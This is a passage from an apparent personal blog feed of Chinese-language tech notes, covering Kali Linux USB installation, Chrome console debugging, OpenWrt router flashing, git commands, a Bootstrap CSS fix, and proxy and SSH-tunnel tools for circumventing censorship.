class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"reveal"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"handle"</span>&gt;</span>CLick here to Reveal Hidden Text<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This paragraph is hidden.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Js可以放在Url中实现,使用javascript:协议<br>for example:(所有浏览器均支持)<br>  <code>&lt;a href=&quot;javascript:alert(&#39;123&#39;);&quot;&gt;WTF?&lt;/a&gt;</code></li>
</ul>
<h3 id="针对IE的条件注释"><a href="#针对IE的条件注释" class="headerlink" title="针对IE的条件注释"></a>针对IE的条件注释</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--[if IE6]&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[将Kali安装到U盘]]></title>
      <url>http://csser.work/09/28/2015/kali-install-2/</url>
      <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此方法只在MBR引导情况下实现</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>虚拟机(VM/VirtualBox)<br>download<a href="https://www.kali.org/downloads/" target="_blank" rel="external">Kali Linux</a></p>
<h3 id="虚拟机操作"><a href="#虚拟机操作" class="headerlink" title="虚拟机操作"></a>虚拟机操作</h3><ol>
<li>正常创建一个新的虚拟机,选择稍后安装系统</li>
<li>创建完之后,设置该虚拟机属性,cd/dvd中加载所要安装的ISO文件.</li>
<li>将刚才创建的硬盘<code>移除</code>!,顺便检查一下USB驱动是否添加,是否为3.0</li>
<li>运行虚拟机,进入开始画面之后插入U盘.出现如下画面显示我们的U盘正常识别,点击OK进行加载<img src="/imgs//kali install2/1.jpg" alt="1"></li>
<li>之后按照下图指示进行连接(和宿主机切断连接),<br><img src="/imgs//kali install2/2.jpg" alt="2"></li>
<li>之后就可以进行一般的GUI安装了.</li>
</ol>
<h3 id="x64位的Vt-x问题"><a href="#x64位的Vt-x问题" class="headerlink" title="x64位的Vt-x问题"></a>x64位的Vt-x问题</h3><p>自己在安装的时候出现一个非常恶心的一个问题:<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VMware提示VT-<span class="keyword">x</span>未开启</span><br></pre></td></tr></table></figure></p>
<p>搜索之后都说Bios中进行设置,然而我的bios是精简版的,支持但是没法开启.<br>搜了半天,发现电脑是<code>一直开着Vt-x的!</code>,360的主动防御干的好事:( ,虽然开启不启动,但是依然存在一个服务项,所以开虚拟机前先开启360,等到360提示关闭<code>晶核引擎</code>之后可以正常执行流程..</p>
<h2 id="加一个本地硬盘安装的实例"><a href="#加一个本地硬盘安装的实例" class="headerlink" title="加一个本地硬盘安装的实例"></a>加一个本地硬盘安装的实例</h2><p><a href="http://blog.sciencenet.cn/blog-3027933-956284.html" target="_blank" rel="external">Lifeifu博客</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://zdzhu.blog.51cto.com/6180070/1574543" target="_blank" rel="external">张舵主’Blog</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Kali UEFI安装]]></title>
      <url>http://csser.work/09/20/2015/kali-Install-1/</url>
      <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
<li>download<a href="https://www.kali.org/downloads/" target="_blank" rel="external">Kali Linux</a>,记得校验SHA1Sum</li>
<li>UltraISO 烧录至USB</li>
<li>打开boot文件夹,用归档工具(zip等)把img里面的三个文件夹解压至根目录</li>
<li>利用DiskGenius/PartAssist切一块分区(未分配状态)来预留一块连续空间.</li>
</ol>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li>Windows下<code>shift+重启</code>进入BIOS界面,设置优先级</li>
<li>选择GUI安装,进入正常安装流程</li>
<li>前几次按照系统推荐的分区导致<code>/</code>剩余空间很小,重装几次之后找到一种方法:首先利用系统自动配置一套分区,之后删除那些改变的分区,改为自己想要的分区.<br>因为不怎么了解boot中efi分区文件的具体操作,所以采用这种笨办法进行分区,此时,系统并不会报’efi分区未设置’这个问题</li>
</ol>
<h2 id="Ubuntu-的EFI"><a href="#Ubuntu-的EFI" class="headerlink" title="Ubuntu 的EFI"></a>Ubuntu 的EFI</h2><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>MBR分区的硬盘要注意自己的主分区是否足够,否则一直会失败<br>发现UEFI引导模式是不可能制作成一个可移动式的系统(除非你只使用安装时候的电脑,未实现)</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Chrome调试合集]]></title>
      <url>http://csser.work/07/15/2015/js-chrome-console/</url>
      <content type="html"><![CDATA[<h2 id="Chrome调试"><a href="#Chrome调试" class="headerlink" title="Chrome调试"></a>Chrome调试</h2><ul>
<li>shift+enter可多行输入</li>
</ul>
<ol>
<li>样式<br> console.info()<br> console.debug()<br> console.warn()<br> console.error()</li>
<li>占位符:<br> console.log()和 c的printf()一样<br> 只能用%d/%i %f %s %o(objective)</li>
<li><p>分组显示:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.group(<span class="string">'第一组信息'</span>);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'第一组信息'</span>);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'第一组信息'</span>);</span><br><span class="line"><span class="built_in">console</span>.groupEnd();</span><br><span class="line"><span class="built_in">console</span>.group(<span class="string">'second'</span>);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'2.1'</span>);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'2.2'</span>);</span><br><span class="line"><span class="built_in">console</span>.groupEnd();</span><br></pre></td></tr></table></figure>
</li>
<li><p>console.dir()    //显示一个对象所有value和func()</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.dir(dog);	<span class="comment">//Object:dog</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>console.dirxml()    //显示node中的html/xml代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> node=<span class="built_in">document</span>.getElementById(<span class="string">'tab1'</span>);</span><br><span class="line"><span class="built_in">console</span>.dirxml(node);</span><br></pre></td></tr></table></figure>
</li>
<li><p>console.assert()    //断言 判断是否为真<br> 测试:<code>console.assert(1==1,&#39;如果为0则出现这句话&#39;);</code><br> chrome下返回undefined<br> ff下不返回值<br> 1==0时chrome和ff均报错</p>
</li>
<li><p>console.trace()    //函数轨迹调用    </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span> (<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.trace();</span><br><span class="line">	<span class="keyword">return</span> a+b;</span><br><span class="line">&#125;	<span class="comment">//js中函数同步执行,可以利用trace追踪有关该函数的相关执行顺序</span></span><br><span class="line"><span class="keyword">var</span> x = add3(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add3</span>(<span class="params">a,b</span>)</span>&#123;<span class="keyword">return</span> add2(a,b);&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add2</span>(<span class="params">a,b</span>)</span>&#123;<span class="keyword">return</span> add1(a,b);&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add1</span>(<span class="params">a,b</span>)</span>&#123;<span class="keyword">return</span> add(a,b);&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>计时功能//计算代码运行时间</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.time(<span class="string">'timer1'</span>);</span><br><span class="line"><span class="comment">// Your function</span></span><br><span class="line"><span class="built_in">console</span>.timeEnd(<span class="string">'timer1'</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>性能分析Profiler</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.profile(<span class="string">'性能分析器一'</span>);</span><br><span class="line">Foo();</span><br><span class="line"><span class="built_in">console</span>.profileEnd();</span><br><span class="line">暂时无法实现这个功能</span><br></pre></td></tr></table></figure>
</li>
<li><p>console.count()    //统计次数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">	i++;</span><br><span class="line">	<span class="built_in">console</span>.count(<span class="string">'执行次数'</span>);</span><br><span class="line">&#125;</span><br><span class="line">foo();foo();foo();</span><br></pre></td></tr></table></figure>
</li>
<li><p>inspect(‘节点’)<br>截取特定的元素于console</p>
</li>
</ol>
<p>//—–更新——</p>
<ol>
<li>console.dir( x );<br>获取对象完整信息<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat</span>(<span class="params"> name, age, score </span>)</span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.name = name ;</span><br><span class="line">	<span class="keyword">this</span>.age = age ;</span><br><span class="line">	<span class="keyword">this</span>.score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> cat( <span class="string">'tom'</span>, <span class="number">10</span>, [<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>]);</span><br><span class="line"><span class="built_in">console</span>.dir( c );</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ol>
<li>$(Chrome 控制台中原生支持类jQuery的选择器)<ul>
<li><code>$_</code></li>
<li><code>$(selector)</code>    选择首元素<br> <code>$$(selector)</code>    选择元素合集</li>
</ul>
</li>
<li><p>keys&amp;values</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tboy=&#123;</span><br><span class="line">	name:<span class="string">'123'</span>,height:<span class="string">'222'</span></span><br><span class="line">&#125;;</span><br><span class="line">keys(tboy);</span><br><span class="line">values(tboy);</span><br></pre></td></tr></table></figure>
</li>
<li><p>debug&amp;undebug<br> 打断点和取消断点</p>
</li>
<li>copy(document.body)<br> 可以复制内容到剪贴板</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.ruanyifeng.com/blog/2011/03/firebug_console_tutorial.html" target="_blank" rel="external">阮一峰</a></li>
<li><a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="external">刘哇勇</a></li>
<li>xxx</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[360弃子C301刷机]]></title>
      <url>http://csser.work/07/08/2015/device-360router/</url>
      <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
<li><a href="http://www.right.com.cn/forum/thread-147319-1-2.html" target="_blank" rel="external">981213</a></li>
<li><a href="http://www.right.com.cn/forum/thread-148810-1-1.html" target="_blank" rel="external">hackpascal</a></li>
<li><a href="http://www.right.com.cn/forum/thread-147651-1-1.html" target="_blank" rel="external">hackpascal</a></li>
<li><a href="http://bbs.xda.cn/thread-11183333-1-1.html" target="_blank" rel="external">固件和Rom区别</a><br>op的web管理界面叫luci</li>
<li><a href="https://wiki.wireshark.org/WinPcap" target="_blank" rel="external">WinSCP</a></li>
<li><a href="https://zh.wikipedia.org/wiki/PuTTY" target="_blank" rel="external">PuTTY</a></li>
<li><a href="http://baike.baidu.com/link?url=Uerpdfz1ewoFE_NYNVIkflLEos2adrvzZUReu4FP_9c09KaT9jcdQn4wlT6V7FLTCErkhGIRi1LsmecyR6c84K#1" target="_blank" rel="external">MTD</a></li>
</ul>
<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><ul>
<li><a href="https://en.wikipedia.org/wiki/Wireless_distribution_system" target="_blank" rel="external">WDS</a></li>
<li><a href="http://bbs.kafan.cn/thread-1697011-1-1.html" target="_blank" rel="external">路由多拨</a></li>
</ul>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="安装OpenWrt"><a href="#安装OpenWrt" class="headerlink" title="安装OpenWrt"></a>安装OpenWrt</h3><pre><code>IP地址:192.168.1.3(2-255)
子网掩码:255.255.255.0
上传地址:http://192.168.1.1/upgrade.html
按着360官方人员讲的:
</code></pre><p><a href="http://www.right.com.cn/forum/thread-147329-1-1.html" target="_blank" rel="external">恩山/兼容官方固件</a>直接在luyou360.cn直接刷了这个固件,但是等了大概20分钟,耐心不足..直接强退,发现变砖..晚上回来继续看,尝试直接进入192.168.1.1刷官方固件,然并卵.官方固件认证失败,醉.然后试了半天恩山论坛大神的固件包固然给刷进去了233.<br>    所刷固件:<br><a href="http://www.right.com.cn/forum/thread-147319-1-2.html" target="_blank" rel="external">OpenWrt固件</a><br>    PS:第一次刷机需要刷入ART(和OpenWrt的web刷入方法一致)</p>
<h3 id="一睹真容"><a href="#一睹真容" class="headerlink" title="一睹真容"></a>一睹真容</h3><pre><code>尼玛,恩山大神要不要这么6啊,webshell,ssh,迅雷,USB支持什么都加进去了!!献上我的膝盖!!!
</code></pre><h3 id="配置有线和无线"><a href="#配置有线和无线" class="headerlink" title="配置有线和无线"></a>配置有线和无线</h3><ul>
<li>网络&gt;接口&gt;wan–&gt;设置pppoe协议,输入宽带账号,密码<br>lan端口需要设置网关为192.168.1.1</li>
<li>无线想刷ART–&gt;刷Uboot</li>
</ul>
<h3 id="刷不死U-boot"><a href="#刷不死U-boot" class="headerlink" title="刷不死U-boot"></a>刷不死U-boot</h3><p>参照大神贴:<a href="http://www.right.com.cn/forum/thread-154561-1-1.html" target="_blank" rel="external">hackpascal</a></p>
<ul>
<li>插曲:刚把Uboot刷完之后,一不小心按了reset,然后wanlan三灯全亮,wifi灯变绿,随后电脑无法识别lan口,变砖无误…正在寻找方案6/26-&gt;发现同地区大神一枚,滚去面基,求罩0. 0-&gt;?(未待完续)</li>
</ul>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>一次手贱刷成砖，然后面基论坛大神，没过几天修好了，但是就没然后了。小忧伤</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Git Daily]]></title>
      <url>http://csser.work/06/30/2015/daily-git/</url>
      <content type="html"><![CDATA[<h2 id="记录遇到的Git"><a href="#记录遇到的Git" class="headerlink" title="记录遇到的Git : )"></a>记录遇到的Git : )</h2><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://rogerdudler.github.io/git-guide/index.zh.html" target="_blank" rel="external">git-the simple guide</a></p>
<h3 id="常见标记"><a href="#常见标记" class="headerlink" title="常见标记"></a>常见标记</h3><pre><code>A: 增加的文件.
C: 文件的一个新拷贝.
D: 删除的一个文件.
M:文件的内容或者mode被修改了.
R: 文件名被修改了.
T: 文件的类型被修改了.
U: 文件没有被合并(你需要完成合并才能进行提交)
X: 未知状态.(很可能是遇到git的bug了,可以向git进行bug report)
</code></pre><p>在git diff-files的手册man git diff-files中可以查到这些标志的说明</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>添加远程主机:<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> remote add [shortname] [url]</span><br></pre></td></tr></table></figure></p>
<p>创建分支<br>            <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> branch experiment</span><br></pre></td></tr></table></figure></p>
<p>切换分支    <strong>这条命令会重写工作区</strong><br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> checkout -b gitcafe-pages</span><br></pre></td></tr></table></figure></p>
<h3 id="陆续增加"><a href="#陆续增加" class="headerlink" title="陆续增加"></a>陆续增加</h3><p>checkout step    //重置工作目录,step为步骤<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout <span class="_">-f</span> step-3</span><br></pre></td></tr></table></figure></p>
<p>———–16年2月————<br>git config –list</p>
<p>for help`<br>    $ git help <v><br>    $ git <v> –help<br>    $ man git-<v></v></v></v></p>
<p>git config user.name/更改特定设置</p>
<p>git status    check the files</p>
<p>git remote add [shortname] [url]    //添加远程仓库</p>
<p>example:<br>    git remote add origin git@github.com:a1exlism/a1exlism<br>    github.io</p>
<p>git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</p>
<p>git-bash-&gt;touch .gitignore    生成该文件</p>
<p>.gitignore文件过滤模式<br>    文件夹过滤:<br>        /mtk/       表示过滤这个文件夹<br>    文件过滤:<br>    指定文件类型:<br>        <em>.zip
        </em>.rar<br>        <em>.via
        </em>.tmp<br>        *.err<br>    指定具体文件:<br>        /mtk/do.c<br>        /mtk/if.h</p>
<p>git depth命令:深度<br>    git clone git@github.com:xxx/xxx –depth=2 最近三个版本</p>
<h3 id="遇见的问题"><a href="#遇见的问题" class="headerlink" title="遇见的问题"></a>遇见的问题</h3><ul>
<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> push origin gitcafe-pages error: src refspec gitcafe-pages does not match an</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>错误原因:本地没有gitcafe-pages分支</p>
<ul>
<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Updates were rejected because the tip of your current branch is behind</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>错误原因:远程仓库的分支比本地的代码要新所以有冲突<br>解决:开新分支提交或者直接git push –force<strong>慎用!</strong></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Bootstrap Navbar Hack]]></title>
      <url>http://csser.work/06/30/2015/bootstrap-navbar-resposive/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>以前用bootstrap的时候也遇到过这么个问题, navbar一写, 然后宽度布局就出现问题了, <code>页面宽度总是大于浏览器宽度</code>.</p>
<h2 id="css-codes"><a href="#css-codes" class="headerlink" title="css-codes"></a>css-codes</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* -- NavBar-Responsive Start  -- */</span></span><br><span class="line"><span class="selector-class">.navbar</span> <span class="selector-class">.container-fluid</span> &#123;</span><br><span class="line">	<span class="attribute">padding-left</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">	<span class="attribute">padding-right</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.navbar-collapse</span>, <span class="selector-class">.navbar-header</span> &#123;</span><br><span class="line">	<span class="attribute">margin-left</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">	<span class="attribute">margin-right</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试样例的话就是官方例子就行了.</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[G4W-collection]]></title>
      <url>http://csser.work/03/20/2015/g4w/</url>
      <content type="html"><![CDATA[<h2 id="Issues"><a href="#Issues" class="headerlink" title="Issues"></a>Issues</h2><p><del>5/35GitHub的大神们更新了gvsIp的使用(版本c35fb8e),简要提一下(Win下):<br>gvsIp已失效</del></p>
<h2 id="1-30-2016update"><a href="#1-30-2016update" class="headerlink" title="1-30-2016update"></a>1-30-2016update</h2><h3 id="弃用goagent，启用xx-net"><a href="#弃用goagent，启用xx-net" class="headerlink" title="弃用goagent，启用xx-net"></a>弃用goagent，启用xx-net</h3><p>好久没更新，<code>xx-net</code>在github可下载，根据goagent原理添加了图形界面，还有个自动扫Ip功能= =<br>妥！原作者的项目使用go语言开坑，<code>goproxy</code></p>
<h3 id="gae部署界面更改"><a href="#gae部署界面更改" class="headerlink" title="gae部署界面更改"></a>gae部署界面更改</h3><p>部署原理不变，界面变化，projectID(档案ID)即为原APPID</p>
<h2 id="3-18-2016update"><a href="#3-18-2016update" class="headerlink" title="3-18-2016update"></a>3-18-2016update</h2><h3 id="手机端更新-推荐"><a href="#手机端更新-推荐" class="headerlink" title="手机端更新,推荐"></a>手机端更新,推荐</h3><p>网址就不列了,原因都懂,优先级如下</p>
<ol>
<li>Lantern</li>
<li>ShadowSocks-Android</li>
<li>Psiphon(听说不怎么安全?好歹socket= =)</li>
</ol>
<h3 id="手机端手动Proxy"><a href="#手机端手动Proxy" class="headerlink" title="手机端手动Proxy"></a>手机端手动Proxy</h3><ol>
<li>ProxyDroid</li>
</ol>
<h2 id="4-3-2016update"><a href="#4-3-2016update" class="headerlink" title="4-3-2016update"></a>4-3-2016update</h2><h3 id="本页面网址更改"><a href="#本页面网址更改" class="headerlink" title="本页面网址更改"></a>本页面网址更改</h3><p>更改后该页面所有网站打开需要多走一步,加密关键词:<code>base</code></p>
<h3 id="正"><a href="#正" class="headerlink" title="正"></a>正</h3><p>窝槽,最近这几天网络真的是全线崩盘,不过看了日期也就默默忍受了=L =<br>依靠GAE的各类软件统统阵亡,花了两天来寻找替代品,未雨绸缪总是好的.</p>
<p>结果如下(PC端):</p>
<ol>
<li><p>lantern配置(太懒,自己没有测试过,还有每个版本差别比较大): <a href="">aHR0cHM6Ly9nb2Nocm9tZS5pbmZvL2xhbnRlcm4tZ3VpZGUv</a><br>据说能达到流畅看油管1080P</p>
</li>
<li><p>SS推荐,自己找了很久,速度还算不错的:<code>不算广告,爱信不信</code><br><a href="aHR0cHM6Ly93d3cuY2VsbHN5c3RlY2guY24=">猫梯</a>  ===&gt;&gt;听说以后改<code>Cisco_Anyconnect</code><br><a href="aHR0cHM6Ly9saWFuamlhbmcubW9l">喵帕斯</a>  ===&gt;&gt;速度很不错!<br>SS的路也走不远了,喝茶的喝茶,闲聊的闲聊:-(</p>
</li>
<li><p>通过Code_could平台<br><strong>移动端搞这个比较麻烦</strong></p>
<ol>
<li>HeroKu</li>
<li>OpenShift</li>
<li>Koding</li>
<li>etc<br>原理都一样: remote机器开的ssh可以为本地一个隧道,进行端口转发即可.<br>条件: <code>开放的SSH</code><br>Code:<blockquote>
<p>ssh -D 7001 username@remote-host</p>
</blockquote>
</li>
</ol>
</li>
</ol>
<p>-D 表示动态绑定 7001为本地端口,如果上传了id_rsa.pub,就没有密码登陆了</p>
<p>Reference见 <a href="./#Bookmarks">Bookmarks</a></p>
<h2 id="Bookmarks"><a href="#Bookmarks" class="headerlink" title="Bookmarks"></a>Bookmarks</h2><p><a href="aHR0cHM6Ly9naXRodWIuY29tL21ob2hhaS9tMmNvbmY=">批量选择GCC IP</a> <a href="aHR0cHM6Ly90b29sYm94Lmdvb2dsZWFwcHMuY29tL2FwcHMvZGlnLw==">Dig</a>  <a href="aHR0cHM6Ly9naXRodWIuY29tL2F6enZ4L2dvZ290ZXN0ZXI=">gogotester</a><br><a href="aHR0cDovL3B1YmxpYy1kbnMudGsv">DNS Server List</a> <a href="dHRwOi8vYmxvZy5uZXRzaC5vcmcvcG9zdHMveW91dHViZS1nb29nbGUtZmFjZWJvb2stdHdpdHRlci13aWtpcGVkaWEtaG9zdHNfMTE5OS5uZXRzaC5odG1sI2hvc3Rz">hosts</a><br><del><a href="#">goagent</a>  <a href="aHR0cDovL3d3dy5pNzA4Ni5jb20vZ2Flamlhc2hlZ29hZ2VudHNoZXpoaWNoYW5namlhbndlbnRpem9uZ2ppZWppamllanVlZmFuZ2Zh">goagent设置常见问题</a></del><br><a href="https://www.heroku.com/" target="_blank" rel="external">Heroku</a> <a href="https://www.openshift.com/" target="_blank" rel="external">OpenShift</a> <a href="Koding.com">Koding</a><br><a href="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwMzkzOTYxNQ==">SSH隧道翻墙-segmentfault</a> <a href="https://hev.cc/1184.html" target="_blank" rel="external">端口转发原理-Heiher’s Blog</a></p>
]]></content>
    </entry>
    
  
  
</search>
